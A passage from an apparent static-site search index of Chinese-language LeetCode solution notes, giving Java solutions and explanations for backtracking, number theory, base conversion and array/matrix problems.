List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; permutes, boolean[] visited, final int[] nums) { if (permuteList.size() == nums.length) { permutes.add(new ArrayList\u0026lt;\u0026gt;(permuteList)); return; } for (int i = 0; i \u0026lt; visited.length; i++) { if (i != 0 \u0026amp;\u0026amp; nums[i] == nums[i - 1] \u0026amp;\u0026amp; !visited[i - 1]) { continue; // 防止重复  } if (visited[i]){ continue; } visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; } } 7. 组合    77. Combinations (Medium)\nLeetcode / 力扣\nIf n = 4 and k = 2, a solution is: [ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4], ] public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combine(int n, int k) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; combineList = new ArrayList\u0026lt;\u0026gt;(); backtracking(combineList, combinations, 1, k, n); return combinations; } private void backtracking(List\u0026lt;Integer\u0026gt; combineList, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations, int start, int k, final int n) { if (k == 0) { combinations.add(new ArrayList\u0026lt;\u0026gt;(combineList)); return; } for (int i = start; i \u0026lt;= n - k + 1; i++) { // 剪枝  combineList.add(i); backtracking(combineList, combinations, i + 1, k - 1, n); combineList.remove(combineList.size() - 1); } } 8. 组合求和    39. Combination Sum (Medium)\nLeetcode / 力扣\ngiven candidate set [2, 3, 6, 7] and target 7, A solution set is: [[7],[2, 2, 3]] public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinationSum(int[] candidates, int target) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations = new ArrayList\u0026lt;\u0026gt;(); backtracking(new ArrayList\u0026lt;\u0026gt;(), combinations, 0, target, candidates); return combinations; } private void backtracking(List\u0026lt;Integer\u0026gt; tempCombination, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations, int start, int target, final int[] candidates) { if (target == 0) { combinations.add(new ArrayList\u0026lt;\u0026gt;(tempCombination)); return; } for (int i = start; i \u0026lt; candidates.length; i++) { if (candidates[i] \u0026lt;= target) { tempCombination.add(candidates[i]); backtracking(tempCombination, combinations, i, target - candidates[i], candidates); tempCombination.remove(tempCombination.size() - 1); } } } 9. 含有相同元素的组合求和    40. Combination Sum II (Medium)\nLeetcode / 力扣\nFor example, given candidate set [10, 1, 2, 7, 6, 1, 5] and target 8, A solution set is: [ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6] ] public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinationSum2(int[] candidates, int target) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations = new ArrayList\u0026lt;\u0026gt;(); Arrays.sort(candidates); backtracking(new ArrayList\u0026lt;\u0026gt;(), combinations, new boolean[candidates.length], 0, target, candidates); return combinations; } private void backtracking(List\u0026lt;Integer\u0026gt; tempCombination, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations, boolean[] hasVisited, int start, int target, final int[] candidates) { if (target == 0) { combinations.add(new ArrayList\u0026lt;\u0026gt;(tempCombination)); return; } for (int i = start; i \u0026lt; candidates.length; i++) { if (i != 0 \u0026amp;\u0026amp; candidates[i] == candidates[i - 1] \u0026amp;\u0026amp; !hasVisited[i - 1]) { continue; } if (candidates[i] \u0026lt;= target) { tempCombination.add(candidates[i]); hasVisited[i] = true; backtracking(tempCombination, combinations, hasVisited, i + 1, target - candidates[i], candidates); hasVisited[i] = false; tempCombination.remove(tempCombination.size() - 1); } } } 10. 1-9 数字的组合求和    216. Combination Sum III (Medium)\nLeetcode / 力扣\nInput: k = 3, n = 9 Output: [[1,2,6], [1,3,5], [2,3,4]] 从 1-9 数字中选出 k 个数不重复的数，使得它们的和为 n。\npublic List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinationSum3(int k, int n) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; path = new ArrayList\u0026lt;\u0026gt;(); backtracking(k, n, 1, path, combinations); return combinations; } private void backtracking(int k, int n, int start, List\u0026lt;Integer\u0026gt; tempCombination, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinations) { if (k == 0 \u0026amp;\u0026amp; n == 0) { combinations.add(new ArrayList\u0026lt;\u0026gt;(tempCombination)); return; } if (k == 0 || n == 0) { return; } for (int i = start; i \u0026lt;= 9; i++) { tempCombination.add(i); backtracking(k - 1, n - i, i + 1, tempCombination, combinations); tempCombination.remove(tempCombination.size() - 1); } } 11. 子集    78. Subsets (Medium)\nLeetcode / 力扣\n找出集合的所有子集，子集不能重复，[1, 2] 和 [2, 1] 这种子集算重复\npublic List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets(int[] nums) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; tempSubset = new ArrayList\u0026lt;\u0026gt;(); for (int size = 0; size \u0026lt;= nums.length; size++) { backtracking(0, tempSubset, subsets, size, nums); // 不同的子集大小  } return subsets; } private void backtracking(int start, List\u0026lt;Integer\u0026gt; tempSubset, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets, final int size, final int[] nums) { if (tempSubset.size() == size) { subsets.add(new ArrayList\u0026lt;\u0026gt;(tempSubset)); return; } for (int i = start; i \u0026lt; nums.length; i++) { tempSubset.add(nums[i]); backtracking(i + 1, tempSubset, subsets, size, nums); tempSubset.remove(tempSubset.size() - 1); } } 12. 含有相同元素求子集    90. Subsets II (Medium)\nLeetcode / 力扣\nFor example, If nums = [1,2,2], a solution is: [ [2], [1], [1,2,2], [2,2], [1,2], [] ] public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsetsWithDup(int[] nums) { Arrays.sort(nums); List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; tempSubset = new ArrayList\u0026lt;\u0026gt;(); boolean[] hasVisited = new boolean[nums.length]; for (int size = 0; size \u0026lt;= nums.length; size++) { backtracking(0, tempSubset, subsets, hasVisited, size, nums); // 不同的子集大小  } return subsets; } private void backtracking(int start, List\u0026lt;Integer\u0026gt; tempSubset, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; subsets, boolean[] hasVisited, final int size, final int[] nums) { if (tempSubset.size() == size) { subsets.add(new ArrayList\u0026lt;\u0026gt;(tempSubset)); return; } for (int i = start; i \u0026lt; nums.length; i++) { if (i != 0 \u0026amp;\u0026amp; nums[i] == nums[i - 1] \u0026amp;\u0026amp; !hasVisited[i - 1]) { continue; } tempSubset.add(nums[i]); hasVisited[i] = true; backtracking(i + 1, tempSubset, subsets, hasVisited, size, nums); hasVisited[i] = false; tempSubset.remove(tempSubset.size() - 1); } } 13. 分割字符串使得每个部分都是回文数    131. Palindrome Partitioning (Medium)\nLeetcode / 力扣\nFor example, given s = \u0026#34;aab\u0026#34;, Return [ [\u0026#34;aa\u0026#34;,\u0026#34;b\u0026#34;], [\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;] ] public List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; partition(String s) { List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; partitions = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;String\u0026gt; tempPartition = new ArrayList\u0026lt;\u0026gt;(); doPartition(s, partitions, tempPartition); return partitions; } private void doPartition(String s, List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; partitions, List\u0026lt;String\u0026gt; tempPartition) { if (s.length() == 0) { partitions.add(new ArrayList\u0026lt;\u0026gt;(tempPartition)); return; } for (int i = 0; i \u0026lt; s.length(); i++) { if (isPalindrome(s, 0, i)) { tempPartition.add(s.substring(0, i + 1)); doPartition(s.substring(i + 1), partitions, tempPartition); tempPartition.remove(tempPartition.size() - 1); } } } private boolean isPalindrome(String s, int begin, int end) { while (begin \u0026lt; end) { if (s.charAt(begin++) != s.charAt(end--)) { return false; } } return true; } 14. 数独    37. Sudoku Solver (Hard)\nLeetcode / 力扣\n\nprivate boolean[][] rowsUsed = new boolean[9][10]; private boolean[][] colsUsed = new boolean[9][10]; private boolean[][] cubesUsed = new boolean[9][10]; private char[][] board; public void solveSudoku(char[][] board) { this.board = board; for (int i = 0; i \u0026lt; 9; i++) for (int j = 0; j \u0026lt; 9; j++) { if (board[i][j] == \u0026#39;.\u0026#39;) { continue; } int num = board[i][j] - \u0026#39;0\u0026#39;; rowsUsed[i][num] = true; colsUsed[j][num] = true; cubesUsed[cubeNum(i, j)][num] = true; } backtracking(0, 0); } private boolean backtracking(int row, int col) { while (row \u0026lt; 9 \u0026amp;\u0026amp; board[row][col] != \u0026#39;.\u0026#39;) { row = col == 8 ? row + 1 : row; col = col == 8 ? 0 : col + 1; } if (row == 9) { return true; } for (int num = 1; num \u0026lt;= 9; num++) { if (rowsUsed[row][num] || colsUsed[col][num] || cubesUsed[cubeNum(row, col)][num]) { continue; } rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = true; board[row][col] = (char) (num + \u0026#39;0\u0026#39;); if (backtracking(row, col)) { return true; } board[row][col] = \u0026#39;.\u0026#39;; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = false; } return false; } private int cubeNum(int i, int j) { int r = i / 3; int c = j / 3; return r * 3 + c; } 15. N 皇后    51. N-Queens (Hard)\nLeetcode / 力扣\n\n在 n*n 的矩阵中摆放 n 个皇后，并且每个皇后不能在同一行，同一列，同一对角线上，求所有的 n 皇后的解。\n一行一行地摆放，在确定一行中的那个皇后应该摆在哪一列时，需要用三个标记数组来确定某一列是否合法，这三个标记数组分别为：列标记数组、45 度对角线标记数组和 135 度对角线标记数组。\n45 度对角线标记数组的长度为 2 * n - 1，通过下图可以明确 (r, c) 的位置所在的数组下标为 r + c。\n\n135 度对角线标记数组的长度也是 2 * n - 1，(r, c) 的位置所在的数组下标为 n - 1 - (r - c)。\n\nprivate List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; solutions; private char[][] nQueens; private boolean[] colUsed; private boolean[] diagonals45Used; private boolean[] diagonals135Used; private int n; public List\u0026lt;List\u0026lt;String\u0026gt;\u0026gt; solveNQueens(int n) { solutions = new ArrayList\u0026lt;\u0026gt;(); nQueens = new char[n][n]; for (int i = 0; i \u0026lt; n; i++) { Arrays.fill(nQueens[i], \u0026#39;.\u0026#39;); } colUsed = new boolean[n]; diagonals45Used = new boolean[2 * n - 1]; diagonals135Used = new boolean[2 * n - 1]; this.n = n; backtracking(0); return solutions; } private void backtracking(int row) { if (row == n) { List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (char[] chars : nQueens) { list.add(new String(chars)); } solutions.add(list); return; } for (int col = 0; col \u0026lt; n; col++) { int diagonals45Idx = row + col; int diagonals135Idx = n - 1 - (row - col); if (colUsed[col] || diagonals45Used[diagonals45Idx] || diagonals135Used[diagonals135Idx]) { continue; } nQueens[row][col] = \u0026#39;Q\u0026#39;; colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = true; backtracking(row + 1); colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = false; nQueens[row][col] = \u0026#39;.\u0026#39;; } } "},{"id":250,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%95%B0%E5%AD%A6/","title":"Leetcode 题解 - 数学","parent":"笔记","content":"Leetcode 题解 - 数学     Leetcode 题解 - 数学  素数分解 整除 最大公约数最小公倍数  1. 生成素数序列 2. 最大公约数 3. 使用位操作和减法求解最大公约数   进制转换  1. 7 进制 2. 16 进制 3. 26 进制   阶乘  1. 统计阶乘尾部有多少个 0   字符串加法减法  1. 二进制加法 2. 字符串加法   相遇问题  1. 改变数组元素使所有的数组元素都相等   多数投票问题  1. 数组中出现次数多于 n / 2 的元素   其它  1. 平方数 2. 3 的 n 次方 3. 乘积数组 4. 找出数组中的乘积最大的三个数      素数分解    每一个数都可以分解成素数的乘积，例如 84 = 22 * 31 * 50 * 71 * 110 * 130 * 170 * …\n整除    令 x = 2m0 * 3m1 * 5m2 * 7m3 * 11m4 * …\n令 y = 2n0 * 3n1 * 5n2 * 7n3 * 11n4 * …\n如果 x 整除 y（y mod x == 0），则对于所有 i，mi \u0026lt;= ni。\n最大公约数最小公倍数    x 和 y 的最大公约数为：gcd(x,y) = 2min(m0,n0) * 3min(m1,n1) * 5min(m2,n2) * \u0026hellip;\nx 和 y 的最小公倍数为：lcm(x,y) = 2max(m0,n0) * 3max(m1,n1) * 5max(m2,n2) * \u0026hellip;\n1. 生成素数序列    204. Count Primes (Easy)\nLeetcode / 力扣\n埃拉托斯特尼筛法在每次找到一个素数时，将能被素数整除的数排除掉。\npublic int countPrimes(int n) { boolean[] notPrimes = new boolean[n + 1]; int count = 0; for (int i = 2; i \u0026lt; n; i++) { if (notPrimes[i]) { continue; } count++; // 从 i * i 开始，因为如果 k \u0026lt; i，那么 k * i 在之前就已经被去除过了  for (long j = (long) (i) * i; j \u0026lt; n; j += i) { notPrimes[(int) j] = true; } } return count; } 2. 最大公约数    int gcd(int a, int b) { return b == 0 ? a : gcd(b, a % b); } 最小公倍数为两数的乘积除以最大公约数。\nint lcm(int a, int b) { return a * b / gcd(a, b); } 3. 使用位操作和减法求解最大公约数    编程之美：2.7\n对于 a 和 b 的最大公约数 f(a, b)，有：\n 如果 a 和 b 均为偶数，f(a, b) = 2*f(a/2, b/2); 如果 a 是偶数 b 是奇数，f(a, b) = f(a/2, b); 如果 b 是偶数 a 是奇数，f(a, b) = f(a, b/2); 如果 a 和 b 均为奇数，f(a, b) = f(b, a-b);  乘 2 和除 2 都可以转换为移位操作。\npublic int gcd(int a, int b) { if (a \u0026lt; b) { return gcd(b, a); } if (b == 0) { return a; } boolean isAEven = isEven(a), isBEven = isEven(b); if (isAEven \u0026amp;\u0026amp; isBEven) { return 2 * gcd(a \u0026gt;\u0026gt; 1, b \u0026gt;\u0026gt; 1); } else if (isAEven \u0026amp;\u0026amp; !isBEven) { return gcd(a \u0026gt;\u0026gt; 1, b); } else if (!isAEven \u0026amp;\u0026amp; isBEven) { return gcd(a, b \u0026gt;\u0026gt; 1); } else { return gcd(b, a - b); } } 进制转换    1. 7 进制    504. Base 7 (Easy)\nLeetcode / 力扣\npublic String convertToBase7(int num) { if (num == 0) { return \u0026#34;0\u0026#34;; } StringBuilder sb = new StringBuilder(); boolean isNegative = num \u0026lt; 0; if (isNegative) { num = -num; } while (num \u0026gt; 0) { sb.append(num % 7); num /= 7; } String ret = sb.reverse().toString(); return isNegative ? \u0026#34;-\u0026#34; + ret : ret; } Java 中 static String toString(int num, int radix) 可以将一个整数转换为 radix 进制表示的字符串。\npublic String convertToBase7(int num) { return Integer.toString(num, 7); } 2. 16 进制    405. Convert a Number to Hexadecimal (Easy)\nLeetcode / 力扣\nInput: 26 Output: \u0026#34;1a\u0026#34; Input: -1 Output: \u0026#34;ffffffff\u0026#34; 负数要用它的补码形式。\npublic String toHex(int num) { char[] map = {\u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;}; if (num == 0) return \u0026#34;0\u0026#34;; StringBuilder sb = new StringBuilder(); while (num != 0) { sb.append(map[num \u0026amp; 0b1111]); num \u0026gt;\u0026gt;\u0026gt;= 4; // 因为考虑的是补码形式，因此符号位就不能有特殊的意义，需要使用无符号右移，左边填 0  } return sb.reverse().toString(); } 3. 26 进制    168. Excel Sheet Column Title (Easy)\nLeetcode / 力扣\n1 -\u0026gt; A 2 -\u0026gt; B 3 -\u0026gt; C ... 26 -\u0026gt; Z 27 -\u0026gt; AA 28 -\u0026gt; AB 因为是从 1 开始计算的，而不是从 0 开始，因此需要对 n 执行 -1 操作。\npublic String convertToTitle(int n) { if (n == 0) { return \u0026#34;\u0026#34;; } n--; return convertToTitle(n / 26) + (char) (n % 26 + \u0026#39;A\u0026#39;); } 阶乘    1. 统计阶乘尾部有多少个 0    172. Factorial Trailing Zeroes (Easy)\nLeetcode / 力扣\n尾部的 0 由 2 * 5 得来，2 的数量明显多于 5 的数量，因此只要统计有多少个 5 即可。\n对于一个数 N，它所包含 5 的个数为：N/5 + N/52 + N/53 + \u0026hellip;，其中 N/5 表示不大于 N 的数中 5 的倍数贡献一个 5，N/52 表示不大于 N 的数中 52 的倍数再贡献一个 5 \u0026hellip;。\npublic int trailingZeroes(int n) { return n == 0 ? 0 : n / 5 + trailingZeroes(n / 5); } 如果统计的是 N! 的二进制表示中最低位 1 的位置，只要统计有多少个 2 即可，该题目出自 编程之美：2.2 。和求解有多少个 5 一样，2 的个数为 N/2 + N/22 + N/23 + \u0026hellip;\n字符串加法减法    1. 二进制加法    67. Add Binary (Easy)\nLeetcode / 力扣\na = \u0026#34;11\u0026#34; b = \u0026#34;1\u0026#34; Return \u0026#34;100\u0026#34;. public String addBinary(String a, String b) { int i = a.length() - 1, j = b.length() - 1, carry = 0; StringBuilder str = new StringBuilder(); while (carry == 1 || i \u0026gt;= 0 || j \u0026gt;= 0) { if (i \u0026gt;= 0 \u0026amp;\u0026amp; a.charAt(i--) == \u0026#39;1\u0026#39;) { carry++; } if (j \u0026gt;= 0 \u0026amp;\u0026amp; b.charAt(j--) == \u0026#39;1\u0026#39;) { carry++; } str.append(carry % 2); carry /= 2; } return str.reverse().toString(); } 2. 字符串加法    415. Add Strings (Easy)\nLeetcode / 力扣\n字符串的值为非负整数。\npublic String addStrings(String num1, String num2) { StringBuilder str = new StringBuilder(); int carry = 0, i = num1.length() - 1, j = num2.length() - 1; while (carry == 1 || i \u0026gt;= 0 || j \u0026gt;= 0) { int x = i \u0026lt; 0 ? 0 : num1.charAt(i--) - \u0026#39;0\u0026#39;; int y = j \u0026lt; 0 ? 0 : num2.charAt(j--) - \u0026#39;0\u0026#39;; str.append((x + y + carry) % 10); carry = (x + y + carry) / 10; } return str.reverse().toString(); } 相遇问题    1. 改变数组元素使所有的数组元素都相等    462. Minimum Moves to Equal Array Elements II (Medium)\nLeetcode / 力扣\nInput: [1,2,3] Output: 2 Explanation: Only two moves are needed (remember each move increments or decrements one element): [1,2,3] =\u0026gt; [2,2,3] =\u0026gt; [2,2,2] 每次可以对一个数组元素加一或者减一，求最小的改变次数。\n这是个典型的相遇问题，移动距离最小的方式是所有元素都移动到中位数。理由如下：\n设 m 为中位数。a 和 b 是 m 两边的两个元素，且 b \u0026gt; a。要使 a 和 b 相等，它们总共移动的次数为 b - a，这个值等于 (b - m) + (m - a)，也就是把这两个数移动到中位数的移动次数。\n设数组长度为 N，则可以找到 N/2 对 a 和 b 的组合，使它们都移动到 m 的位置。\n解法 1\n先排序，时间复杂度：O(NlogN)\npublic int minMoves2(int[] nums) { Arrays.sort(nums); int move = 0; int l = 0, h = nums.length - 1; while (l \u0026lt;= h) { move += nums[h] - nums[l]; l++; h--; } return move; } 解法 2\n使用快速选择找到中位数，时间复杂度 O(N)\npublic int minMoves2(int[] nums) { int move = 0; int median = findKthSmallest(nums, nums.length / 2); for (int num : nums) { move += Math.abs(num - median); } return move; } private int findKthSmallest(int[] nums, int k) { int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int j = partition(nums, l, h); if (j == k) { break; } if (j \u0026lt; k) { l = j + 1; } else { h = j - 1; } } return nums[k]; } private int partition(int[] nums, int l, int h) { int i = l, j = h + 1; while (true) { while (nums[++i] \u0026lt; nums[l] \u0026amp;\u0026amp; i \u0026lt; h) ; while (nums[--j] \u0026gt; nums[l] \u0026amp;\u0026amp; j \u0026gt; l) ; if (i \u0026gt;= j) { break; } swap(nums, i, j); } swap(nums, l, j); return j; } private void swap(int[] nums, int i, int j) { int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp; } 多数投票问题    1. 数组中出现次数多于 n / 2 的元素    169. Majority Element (Easy)\nLeetcode / 力扣\n先对数组排序，最中间那个数出现次数一定多于 n / 2。\npublic int majorityElement(int[] nums) { Arrays.sort(nums); return nums[nums.length / 2]; } 可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。可以这么理解该算法：使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素不相等时，令 cnt\u0026ndash;。如果前面查找了 i 个元素，且 cnt == 0，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2，因为如果多于 i / 2 的话 cnt 就一定不会为 0。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。\npublic int majorityElement(int[] nums) { int cnt = 0, majority = nums[0]; for (int num : nums) { majority = (cnt == 0) ? num : majority; cnt = (majority == num) ? cnt + 1 : cnt - 1; } return majority; } 其它    1. 平方数    367. Valid Perfect Square (Easy)\nLeetcode / 力扣\nInput: 16 Returns: True 平方序列：1,4,9,16,..\n间隔：3,5,7,\u0026hellip;\n间隔为等差数列，使用这个特性可以得到从 1 开始的平方序列。\npublic boolean isPerfectSquare(int num) { int subNum = 1; while (num \u0026gt; 0) { num -= subNum; subNum += 2; } return num == 0; } 2. 3 的 n 次方    326. Power of Three (Easy)\nLeetcode / 力扣\npublic boolean isPowerOfThree(int n) { return n \u0026gt; 0 \u0026amp;\u0026amp; (1162261467 % n == 0); } 3. 乘积数组    238. Product of Array Except Self (Medium)\nLeetcode / 力扣\nFor example, given [1,2,3,4], return [24,12,8,6]. 给定一个数组，创建一个新数组，新数组的每个元素为原始数组中除了该位置上的元素之外所有元素的乘积。\n要求时间复杂度为 O(N)，并且不能使用除法。\npublic int[] productExceptSelf(int[] nums) { int n = nums.length; int[] products = new int[n]; Arrays.fill(products, 1); int left = 1; for (int i = 1; i \u0026lt; n; i++) { left *= nums[i - 1]; products[i] *= left; } int right = 1; for (int i = n - 2; i \u0026gt;= 0; i--) { right *= nums[i + 1]; products[i] *= right; } return products; } 4. 找出数组中的乘积最大的三个数    628. Maximum Product of Three Numbers (Easy)\nLeetcode / 力扣\nInput: [1,2,3,4] Output: 24 public int maximumProduct(int[] nums) { int max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE, min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE; for (int n : nums) { if (n \u0026gt; max1) { max3 = max2; max2 = max1; max1 = n; } else if (n \u0026gt; max2) { max3 = max2; max2 = n; } else if (n \u0026gt; max3) { max3 = n; } if (n \u0026lt; min1) { min2 = min1; min1 = n; } else if (n \u0026lt; min2) { min2 = n; } } return Math.max(max1*max2*max3, max1*min1*min2); } "},{"id":251,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5/","title":"Leetcode 题解 - 数组与矩阵","parent":"笔记","content":"Leetcode 题解 - 数组与矩阵     Leetcode 题解 - 数组与矩阵  1. 把数组中的 0 移到末尾 2. 改变矩阵维度 3. 找出数组中最长的连续 1 4. 有序矩阵查找 5. 有序矩阵的 Kth Element 6. 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数 7. 找出数组中重复的数，数组值在 [1, n] 之间 8. 数组相邻差值的个数 9. 数组的度 10. 对角元素相等的矩阵 11. 嵌套数组 12. 分隔数组    1. 把数组中的 0 移到末尾    283. Move Zeroes (Easy)\nLeetcode / 力扣\nFor example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0]. public void moveZeroes(int[] nums) { int idx = 0; for (int num : nums) { if (num != 0) { nums[idx++] = num; } } while (idx \u0026lt; nums.length) { nums[idx++] = 0; } } 2. 改变矩阵维度    566. Reshape the Matrix (Easy)\nLeetcode / 力扣\nInput: nums = [[1,2], [3,4]] r = 1, c = 4 Output: [[1,2,3,4]] Explanation: The row-traversing of nums is [1,2,3,4]. The new reshaped matrix is a 1 * 4 matrix, fill it row by row by using the previous list. public int[][] matrixReshape(int[][] nums, int r, int c) { int m = nums.length, n = nums[0].length; if (m * n != r * c) { return nums; } int[][] reshapedNums = new int[r][c]; int index = 0; for (int i = 0; i \u0026lt; r; i++) { for (int j = 0; j \u0026lt; c; j++) { reshapedNums[i][j] = nums[index / n][index % n]; index++; } } return reshapedNums; } 3. 找出数组中最长的连续 1    485. Max Consecutive Ones (Easy)\nLeetcode / 力扣\npublic int findMaxConsecutiveOnes(int[] nums) { int max = 0, cur = 0; for (int x : nums) { cur = x == 0 ? 0 : cur + 1; max = Math.max(max, cur); } return max; } 4. 有序矩阵查找    240. Search a 2D Matrix II (Medium)\nLeetcode / 力扣\n[ [ 1, 5, 9], [10, 11, 13], [12, 13, 15] ] public boolean searchMatrix(int[][] matrix, int target) { if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int m = matrix.length, n = matrix[0].length; int row = 0, col = n - 1; while (row \u0026lt; m \u0026amp;\u0026amp; col \u0026gt;= 0) { if (target == matrix[row][col]) return true; else if (target \u0026lt; matrix[row][col]) col--; else row++; } return false; } 5. 有序矩阵的 Kth Element    378. Kth Smallest Element in a Sorted Matrix ((Medium))\nLeetcode / 力扣\nmatrix = [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15] ], k = 8, return 13. 解题参考：Share my thoughts and Clean Java Code\n二分查找解法：\npublic int kthSmallest(int[][] matrix, int k) { int m = matrix.length, n = matrix[0].length; int lo = matrix[0][0], hi = matrix[m - 1][n - 1]; while (lo \u0026lt;= hi) { int mid = lo + (hi - lo) / 2; int cnt = 0; for (int i = 0; i \u0026lt; m; i++) { for (int j = 0; j \u0026lt; n \u0026amp;\u0026amp; matrix[i][j] \u0026lt;= mid; j++) { cnt++; } } if (cnt \u0026lt; k) lo = mid + 1; else hi = mid - 1; } return lo; } 堆解法：\npublic int kthSmallest(int[][] matrix, int k) { int m = matrix.length, n = matrix[0].length; PriorityQueue\u0026lt;Tuple\u0026gt; pq = new PriorityQueue\u0026lt;Tuple\u0026gt;(); for(int j = 0; j \u0026lt; n; j++) pq.offer(new Tuple(0, j, matrix[0][j])); for(int i = 0; i \u0026lt; k - 1; i++) { // 小根堆，去掉 k - 1 个堆顶元素，此时堆顶元素就是第 k 的数  Tuple t = pq.poll(); if(t.x == m - 1) continue; pq.offer(new Tuple(t.x + 1, t.y, matrix[t.x + 1][t.y])); } return pq.poll().val; } class Tuple implements Comparable\u0026lt;Tuple\u0026gt; { int x, y, val; public Tuple(int x, int y, int val) { this.x = x; this.y = y; this.val = val; } @Override public int compareTo(Tuple that) { return this.val - that.val; } } 6. 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数    645. Set Mismatch (Easy)\nLeetcode / 力扣\nInput: nums = [1,2,2,4] Output: [2,3] Input: nums = [1,2,2,4] Output: [2,3] 最直接的方法是先对数组进行排序，这种方法时间复杂度为 O(NlogN)。本题可以以 O(N) 的时间复杂度、O(1) 空间复杂度来求解。\n主要思想是通过交换数组元素，使得数组上的元素在正确的位置上。\npublic int[] findErrorNums(int[] nums) { for (int i = 0; i \u0026lt; nums.length; i++) { while (nums[i] != i + 1 \u0026amp;\u0026amp; nums[nums[i] - 1] != nums[i]) { swap(nums, i, nums[i] - 1); } } for (int i = 0; i \u0026lt; nums.length; i++) { if (nums[i] != i + 1) { return new int[]{nums[i], i + 1}; } } return null; } private void swap(int[] nums, int i, int j) { int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp; } 7. 找出数组中重复的数，数组值在 [1, n] 之间    287. Find the Duplicate Number (Medium)\nLeetcode / 力扣\n要求不能修改数组，也不能使用额外的空间。\n二分查找解法：\npublic int findDuplicate(int[] nums) { int l = 1, h = nums.length - 1; while (l \u0026lt;= h) { int mid = l + (h - l) / 2; int cnt = 0; for (int i = 0; i \u0026lt; nums.length; i++) { if (nums[i] \u0026lt;= mid) cnt++; } if (cnt \u0026gt; mid) h = mid - 1; else l = mid + 1; } return l; } 双指针解法，类似于有环链表中找出环的入口：\npublic int findDuplicate(int[] nums) { int slow = nums[0], fast = nums[nums[0]]; while (slow != fast) { slow = nums[slow]; fast = nums[nums[fast]]; } fast = 0; while (slow != fast) { slow = nums[slow]; fast = nums[fast]; } return slow; } 8. 数组相邻差值的个数    667. Beautiful Arrangement II (Medium)\nLeetcode / 力扣\nInput: n = 3, k = 2 Output: [1, 3, 2] Explanation: The [1, 3, 2] has three different positive integers ranging from 1 to 3, and the [2, 1] has exactly 2 distinct integers: 1 and 2. 题目描述：数组元素为 1~n 的整数，要求构建数组，使得相邻元素的差值不相同的个数为 k。\n让前 k+1 个元素构建出 k 个不相同的差值，序列为：1 k+1 2 k 3 k-1 \u0026hellip; k/2 k/2+1.\npublic int[] constructArray(int n, int k) { int[] ret = new int[n]; ret[0] = 1; for (int i = 1, interval = k; i \u0026lt;= k; i++, interval--) { ret[i] = i % 2 == 1 ? 